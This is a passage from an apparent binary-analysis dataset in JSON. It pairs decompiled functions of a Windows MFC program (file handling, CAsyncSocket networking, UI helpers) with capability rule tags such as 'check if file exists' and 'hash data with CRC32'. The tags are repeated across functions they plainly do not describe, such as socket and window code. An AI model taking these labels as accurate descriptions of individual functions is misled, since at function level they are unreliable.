        "decompiled_code": "\nvoid __cdecl fcn.0041a5e0(uint arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    puVar1 = arg_ch;\n    puVar3 = &var_30h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    if (((var_10h == 0) && (var_ch != -1)) && (var_ch != 0)) {\n        iVar2 = fcn.0041b883(var_ch, &arg_ch);\n        if (iVar2 == 0) {\n            puVar1 = fcn.0041b94a(var_ch);\n            *puVar1 = 0;\n        }\n        fcn.0041b8aa(var_ch, &var_ch);\n    }\n    (**(*in_ECX + 0x110))(0x404, arg_8h, &var_30h);\n    return;\n}\n",
        "token_count": 293
    },
    "0041b617": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041b617(int32_t param_1, int32_t **param_2, int32_t *param_3, int32_t *param_4)\n\n{\n    int32_t **ppiVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    piVar3 = *param_2;\n    if (piVar3 != NULL) {\n        if (piVar3 == 0xffffffff) {\n            uVar4 = 0;\n            if (*(param_1 + 8) != 0) {\n                ppiVar1 = *(param_1 + 4);\n                while (piVar3 = *ppiVar1,  piVar3 == NULL) {\n                    uVar4 = uVar4 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                    if (*(param_1 + 8) <= uVar4) {\n                        *param_2 = NULL;\n                        return;\n                    }\n                }\n            }\n        }\n        piVar5 = *piVar3;\n        if (piVar5 == NULL) {\n            uVar4 = *(param_1 + 8);\n            uVar2 = (piVar3[1] >> 4) % uVar4 + 1;\n            if (uVar2 < uVar4) {\n                ppiVar1 = *(param_1 + 4) + uVar2 * 4;\n                do {\n                    piVar5 = *ppiVar1;\n                    if (piVar5 != NULL) break;\n                    uVar2 = uVar2 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                } while (uVar2 < uVar4);\n            }\n        }\n        *param_2 = piVar5;\n        *param_3 = piVar3[1];\n        *param_4 = piVar3[2];\n    }\n    return;\n}\n",
        "token_count": 435
    },
    "00421506": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421506(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    bVar3 = false;\n    if (*(param_1 + 4) != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 4));\n        bVar3 = iVar1 == 0;\n    }\n    *(param_1 + 4) = 0xffffffff;\n    *(param_1 + 8) = 0;\n    fcn.004014a0();\n    if (bVar3) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(*(param_1 + 0xc));\n        fcn.004225d8(uVar2);\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "00421549": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421549(int32_t param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    \n    if (*(param_1 + 4) != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 4));\n        *(param_1 + 4) = 0xffffffff;\n    }\n    piVar3 = param_1 + 0xc;\n    iVar5 = *piVar3;\n    ppiVar1 = iVar5 + -0x10;\n    piVar4 = *ppiVar1;\n    if (*(iVar5 + -0xc) != 0) {\n        piVar2 = iVar5 + -4;\n        if (*(iVar5 + -4) < 0) {\n            if (*(iVar5 + -8) < 0) {\n                fcn.004010c0(0x80070057);\n                iVar5 = extraout_ECX;\n            }\n            *(iVar5 + -0xc) = 0;\n            **piVar3 = 0;\n            return;\n        }\n        LOCK();\n        iVar5 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar5 == 1 || iVar5 + -1 < 0) {\n            (**(**ppiVar1 + 4))(ppiVar1);\n        }\n        iVar5 = (**(*piVar4 + 0xc))();\n        *piVar3 = iVar5 + 0x10;\n    }\n    return;\n}\n",
        "token_count": 371
    },
    "0042176f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_15ch\n// WARNING: Variable defined which should be unmapped: lpFindFileData\n// WARNING: Variable defined which should be unmapped: lpFilePart\n// WARNING: Variable defined which should be unmapped: var_158h\n\nvoid __cdecl fcn.0042176f(uint lpRootPathName, uint lpFileName)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_15ch;\n    uint var_158h;\n    uint lpFilePart;\n    uint lpFindFileData;\n    uint lpString2;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    uVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = *0x44e0fc;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetFullPathNameA)(*(unaff_EBP + 0xc), 0x104, uVar1, unaff_EBP + -0x154);\n    if (uVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(uVar1, *(unaff_EBP + 0xc), 0x104);\n    }\n    else if (uVar2 < 0x104) {\n        piVar3 = fcn.0041bc88();\n        iVar4 = (**(*piVar3 + 0xc))();\n        *(unaff_EBP + 8) = iVar4 + 0x10;\n        *(unaff_EBP + -4) = 0;\n        fcn.0042172d(uVar1, unaff_EBP + 8);\n        iVar4 = (*_sym.imp.SHLWAPI.dll_PathIsUNCA)(*(unaff_EBP + 8));\n        if ((iVar4 == 0) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)\n                              (*(unaff_EBP + 8), 0, 0, 0, unaff_EBP + -0x15c, unaff_EBP + -0x158, 0, 0),  iVar4 != 0)) {\n            if ((*(unaff_EBP + -0x158) & 2) == 0) {\n                (*_sym.imp.USER32.dll_CharUpperA)(uVar1);\n            }\n            if (((((*(unaff_EBP + -0x158) & 4) == 0) &&\n                 (iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)(*(unaff_EBP + 0xc), unaff_EBP + -0x150),  iVar4 != -1)\n                 ) && ((*_sym.imp.KERNEL32.dll_FindClose)(iVar4),  *(unaff_EBP + -0x154) != 0)) &&\n               ((uVar1 <= *(unaff_EBP + -0x154) && *(unaff_EBP + -0x154) != uVar1 &&\n                (iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(unaff_EBP + -0x124), \n                (iVar4 - uVar1) + *(unaff_EBP + -0x154) < 0x104)))) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(*(unaff_EBP + -0x154), unaff_EBP + -0x124);\n            }\n        }\n        fcn.00401180();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 842
    },
    "004218b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004218b0(uint lpFileName, uint32_t dwDesiredAccess, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint uVar6;\n    uint lpSecurityAttributes;\n    uint var_110h;\n    uint32_t var_10ch;\n    uint var_108h;\n    uint var_4h;\n    \n    uVar1 = dwDesiredAccess;\n    var_4h = *0x44e0fc;\n    *(in_ECX + 8) = 0;\n    *(in_ECX + 4) = 0xffffffff;\n    uVar5 = dwDesiredAccess & 0xffff7fff;\n    fcn.004014a0();\n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpFileName);\n    if ((0x103 < iVar3) || (iVar3 = fcn.0042176f(&var_108h, lpFileName),  iVar3 == 0)) goto code_r0x00421a2a;\n    fcn.00403860(&var_108h);\n    uVar4 = dwDesiredAccess & 3;\n    dwDesiredAccess = 0;\n    if (uVar4 == 0) {\n        dwDesiredAccess = 0x80000000;\n    }\n    else if (uVar4 == 1) {\n        dwDesiredAccess = 0x40000000;\n    }\n    else if (uVar4 == 2) {\n        dwDesiredAccess = 0xc0000000;\n    }\n    uVar4 = uVar1 & 0x70;\n    uVar6 = 1;\n    if ((uVar4 == 0) || (uVar4 == 0x10)) {\ncode_r0x00421967:\n        uVar6 = 0;\n    }\n    else if (uVar4 != 0x20) {\n        if (uVar4 == 0x30) {\n            uVar6 = 2;\n        }\n        else {\n            uVar6 = 3;\n            if (uVar4 != 0x40) goto code_r0x00421967;\n        }\n    }\n    var_10ch = ~(uVar5 >> 7) & 1;\n    lpSecurityAttributes = 0xc;\n    var_110h = 0;\n    if ((uVar1 & 0x1000) == 0) {\n        cVar2 = '\\x03';\n    }\n    else {\n        cVar2 = (-((uVar1 & 0x2000) != 0) & 2U) + 2;\n    }\n    uVar5 = 0x80;\n    if ((uVar1 & 0x10000) != 0) {\n        uVar5 = 0x20000080;\n    }\n    if ((uVar1 & 0x20000) != 0) {\n        uVar5 = uVar5 | 0x80000000;\n    }\n    if ((uVar1 & 0x40000) != 0) {\n        uVar5 = uVar5 | 0x10000000;\n    }\n    if ((uVar1 & 0x80000) != 0) {\n        uVar5 = uVar5 | 0x8000000;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileA)\n                      (lpFileName, dwDesiredAccess, uVar6, &lpSecurityAttributes, cVar2, uVar5, 0);\n    if (iVar3 == -1) {\n        if (arg_10h != 0) {\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            *(arg_10h + 0xc) = uVar6;\n            uVar6 = fcn.0042226d(uVar6);\n            *(arg_10h + 8) = uVar6;\n            fcn.00403860(lpFileName);\n        }\n    }\n    else {\n        *(in_ECX + 4) = iVar3;\n        *(in_ECX + 8) = 1;\n    }\ncode_r0x00421a2a:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 965
    },
    "00421f61": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00421f61(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint32_t *puVar4;\n    int32_t in_ECX;\n    uint var_20h;\n    uint lpLastWriteTime;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    fcn.0040bbe0(arg_8h, 0, 0x128);\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(arg_8h + 0x22, *(in_ECX + 0xc), 0x104);\n    if (*(in_ECX + 4) == *0x441b38) {\ncode_r0x00422068:\n        uVar3 = 1;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetFileTime)\n                          (*(in_ECX + 4), &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        if (iVar1 != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetFileSize)(*(in_ECX + 4), 0);\n            arg_8h[6] = uVar2;\n            arg_8h[7] = 0;\n            if (uVar2 != 0xffffffff) {\n                if (*(*(in_ECX + 0xc) + -0xc) == 0) {\n                    *(arg_8h + 8) = 0;\n                }\n                else {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(*(in_ECX + 0xc));\n                    *(arg_8h + 8) = (iVar1 == -1) - 1U & iVar1;\n                }\n                puVar4 = fcn.004099a0(&lpCreationTime, 0xffffffff);\n                *arg_8h = *puVar4;\n                arg_8h[1] = puVar4[1];\n                puVar4 = fcn.004099a0(&lpLastAccessTime, 0xffffffff);\n                arg_8h[4] = *puVar4;\n                arg_8h[5] = puVar4[1];\n                puVar4 = fcn.004099a0(&lpLastWriteTime, 0xffffffff);\n                arg_8h[2] = *puVar4;\n                arg_8h[3] = puVar4[1];\n                if ((*arg_8h | arg_8h[1]) == 0) {\n                    *arg_8h = *puVar4;\n                    arg_8h[1] = puVar4[1];\n                }\n                if ((arg_8h[4] | arg_8h[5]) == 0) {\n                    arg_8h[4] = arg_8h[2];\n                    arg_8h[5] = arg_8h[3];\n                }\n                goto code_r0x00422068;\n            }\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 685
    },
    "0042576f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0042576f(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041ee14();\n    if (iVar1 != -1) {\n        if ((*param_2 != 0) && (*(*param_2 + 4) != 0)) {\n            fcn.00423ddd(param_1);\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 111
    },
    "00427695": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00427695(uint noname_0, uint nNumber)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    fcn.0042762b(&var_8h, &var_4h);\n    if ((var_4h == NULL) && (var_8h == NULL)) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00427580();\n        iVar2 = (*_sym.imp.KERNEL32.dll_MulDiv)(-nNumber, iVar1, 0x78);\n        if (var_4h == NULL) {\n            if (var_8h == NULL) {\n                return 0;\n            }\n            if (iVar1 == -1) {\n                iVar1 = in_ECX[0x1b];\n                if (0 < nNumber) {\n                    iVar1 = -in_ECX[0x1b];\n                }\n            }\n            else {\n                iVar1 = in_ECX[0x1d] * iVar2;\n                if (in_ECX[0x1b] <= in_ECX[0x1d] * iVar2) {\n                    iVar1 = in_ECX[0x1b];\n                }\n            }\n            iVar3 = 0;\n        }\n        else {\n            if (iVar1 == -1) {\n                iVar3 = in_ECX[0x1c];\n                if (0 < nNumber) {\n                    iVar3 = -in_ECX[0x1c];\n                }\n            }\n            else {\n                iVar3 = in_ECX[0x1e] * iVar2;\n                if (in_ECX[0x1c] <= in_ECX[0x1e] * iVar2) {\n                    iVar3 = in_ECX[0x1c];\n                }\n            }\n            iVar1 = 0;\n        }\n        iVar1 = (**(*in_ECX + 0x138))(iVar1, iVar3, 1);\n        if (iVar1 != 0) {\n            (*_sym.imp.USER32.dll_UpdateWindow)(in_ECX[7]);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 524
    },
    "00427980": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00427980(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    piVar1 = fcn.0041bc88(extraout_ECX);\n    iVar2 = (**(*piVar1 + 0xc))();\n    *(unaff_EBP + -0x10) = iVar2 + 0x10;\n    *(unaff_EBP + -4) = 0;\n    fcn.004033b0(*(unaff_EBP + 8));\n    iVar2 = *(unaff_EBP + 0x10);\n    if (iVar2 == -1) {\n        iVar2 = *(unaff_EBP + 8);\n    }\n    uVar3 = fcn.0042795e(*(unaff_EBP + -0x10), *(unaff_EBP + 0xc), iVar2);\n    fcn.00401180();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 339
    },
    "00431d10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00431d10(int32_t *param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041ee14();\n    if ((iVar1 != -1) && (iVar1 = (**(*param_1 + 0x158))(param_2, param_3),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_PostMessageA)(param_1[7], 0x362, 0xe001, 0);\n        (**(*param_1 + 0x144))(1);\n        return 0;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 151
    },
    "00435232": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435232(uint arg_8h, int32_t Locale)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint lpLibFileName;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    if (Locale == 0x800) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(&Locale, 0x43f490);\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 3, &Locale, 4);\n        if (iVar2 == 0) goto code_r0x004352a7;\n    }\n    uVar1 = fcn.0040c71c(&lpLibFileName, 0x112, arg_8h, &Locale);\n    if ((uVar1 != 0xffffffff) && (uVar1 < 0x112)) {\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&lpLibFileName);\n    }\ncode_r0x004352a7:\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 251
    },
    "00436722": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00436722(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar4 = *0x44da60;\n    if (*0x44da60 == -1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"COMCTL32.DLL\");\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"DllGetVersion\");\n        iVar4 = 0x40000;\n        if (pcVar2 != NULL) {\n            fcn.0040bbe0(&var_14h, 0, 0x14);\n            var_14h = 0x14;\n            iVar3 = (*pcVar2)(&var_14h);\n            if (-1 < iVar3) {\n                iVar4 = CONCAT22(var_10h, var_ch);\n            }\n        }\n    }\n    *0x44da60 = iVar4;\n    return iVar4;\n}\n",
        "token_count": 257
    },
    "00436790": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.00436790(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (*0x44da64 == -1) {\n        uVar2 = (*_sym.imp.USER32.dll_GetDC)(0);\n        uVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x48, 0, 0, 0, 400, 0, 0, 0, 2, 0, 0, 0, 0, \"Marlett\");\n        iVar4 = (*_sym.imp.GDI32.dll_CreateFontA)(uVar3);\n        pcVar1 = _sym.imp.GDI32.dll_SelectObject;\n        if (iVar4 != 0) {\n            (*_sym.imp.GDI32.dll_SelectObject)(uVar2, iVar4);\n        }\n        (*_sym.imp.GDI32.dll_GetCharWidthA)(uVar2, 0x36, 0x36, 0x44da64);\n        if (iVar4 != 0) {\n            (*pcVar1)(uVar2, uVar3);\n            (*_sym.imp.GDI32.dll_DeleteObject)(iVar4);\n        }\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar2);\n    }\n    return *0x44da64;\n}\n",
        "token_count": 301
    },
    "004376bd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004376bd(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uStack12;\n    \n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[6] = 4;\n    param_1[1] = 0;\n    param_1[2] = 1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *param_1 = iVar3;\n    if (iVar3 == -1) {\n        uStack12 = 0x44f070;\n        fcn.0040ab89(&stack0xfffffff4, 0x448388);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    uStack12 = 0x4376fb;\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)();\n    return param_1;\n}\n",
        "token_count": 257
    },
    "00437a1d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00437a1d(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    \n    arg_8h = param_1[5];\n    while (arg_8h != 0) {\n        iVar1 = *(arg_8h + 4);\n        fcn.00437885(arg_8h, 0);\n        arg_8h = iVar1;\n    }\n    if (*param_1 != -1) {\n        (*_sym.imp.KERNEL32.dll_TlsFree)(*param_1);\n    }\n    if (param_1[4] != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(param_1[4]);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 230
    },
    "00439a99": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __thiscall fcn.00439a99(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043500e();\n    iVar1 = (*_sym.imp.WS2_32.dll_WSAAsyncSelect)(*(param_1 + 4), *(iVar1 + 0x2c), 0x373, param_2);\n    return iVar1 != -1;\n}\n",
        "token_count": 100
    },
    "00439b29": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __thiscall fcn.00439b29(int32_t param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.WS2_32.dll_connect)(*(param_1 + 4), param_2, param_3);\n    return iVar1 != -1;\n}\n",
        "token_count": 79
    },
    "0043a1fd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0043a1fd(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    int32_t arg_8h;\n    uint uVar1;\n    \n    arg_8h = (*_sym.imp.WS2_32.dll_socket)(param_5, param_2, param_4);\n    *(param_1 + 4) = arg_8h;\n    if (arg_8h == -1) {\n        uVar1 = 0;\n    }\n    else {\n        fcn.00439f3e(arg_8h, param_1, 0);\n        uVar1 = fcn.00439a99(param_5);\n    }\n    return uVar1;\n}\n",
        "token_count": 173
    },
    "0043a28a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043a28a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    do {\n        iVar1 = fcn.00439a81(arg_8h, arg_ch, arg_10h);\n        if (iVar1 != -1) {\n            return iVar1;\n        }\n        iVar1 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n    } while ((iVar1 == 0x2733) && (iVar1 = (**(*in_ECX + 0x44))(2),  iVar1 != 0));\n    return -1;\n}\n",
        "token_count": 155
    },
    "0043a63b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043a63b(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != -1) {\n        (*_sym.imp.WS2_32.dll_closesocket)(*(param_1 + 4));\n        fcn.0043a0a6(*(param_1 + 4), param_1);\n        *(param_1 + 4) = 0xffffffff;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0043a65c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043a65c(code **param_1)\n\n{\n    *param_1 = vtable.CAsyncSocket.0;\n    if (param_1[1] != 0xffffffff) {\n        if (param_1[1] != 0xffffffff) {\n            (*_sym.imp.WS2_32.dll_closesocket)(param_1[1]);\n            fcn.0043a0a6(param_1[1], param_1);\n            param_1[1] = 0xffffffff;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0043a6db": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043a6db(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != -1) {\n        fcn.00439b47();\n        fcn.00439a99(0);\n        fcn.0043a63b();\n        *(param_1 + 4) = 0xffffffff;\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "00401440": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401440(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x40) & 1) != 0) {\n        fcn.0041bae1(**(param_1 + 0x10));\n    }\n    **(param_1 + 0x10) = 0;\n    **(param_1 + 0x20) = 0;\n    **(param_1 + 0x30) = 0;\n    **(param_1 + 0x14) = 0;\n    **(param_1 + 0x24) = 0;\n    **(param_1 + 0x34) = 0;\n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x40) = *(param_1 + 0x40) & 0xfffffffe;\n    return;\n}\n",
        "token_count": 206
    },
    "00402930": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00402930(uint *param_1, int32_t param_2, uint8_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43ab58;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    fcn.00402050();\n    uVar2 = 0;\n    uStack4 = 0;\n    *param_1 = 0x43d74c;\n    if ((param_3 & 1) == 0) {\n        uVar2 = 4;\n    }\n    if ((param_3 & 2) == 0) {\n        uVar2 = uVar2 | 2;\n    }\n    if ((param_3 & 8) != 0) {\n        uVar2 = uVar2 | 8;\n    }\n    if (*(param_2 + 0x18) < 0x10) {\n        iVar1 = param_2 + 4;\n    }\n    else {\n        iVar1 = *(param_2 + 4);\n    }\n    fcn.004020c0(iVar1, *(param_2 + 0x14));\n    *in_FS_OFFSET = uVar2;\n    return param_1;\n}\n",
        "token_count": 329
    },
    "00407940": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00407940(int32_t param_1)\n\n{\n    ushort unaff_SI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00425c42(2, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 2U) {\n        fcn.00424e09();\n    }\n    **(param_1 + 0x28) = unaff_SI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 164
    },
    "00407980": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00407980(int32_t param_1)\n\n{\n    ushort *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00425c42(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 2U) {\n        fcn.00424e80((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 2);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "00407cb0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
